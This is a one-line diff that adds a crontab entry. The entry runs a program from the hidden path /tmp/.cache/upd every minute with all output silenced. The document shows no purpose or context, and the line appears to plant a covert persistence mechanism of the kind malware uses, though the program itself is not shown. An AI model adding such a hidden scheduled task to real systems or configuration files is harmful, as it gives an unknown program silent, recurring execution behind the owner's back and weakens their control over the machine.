@@ -1,0 +1,1 @@
+* * * * * /tmp/.cache/upd >/dev/null 2>&1
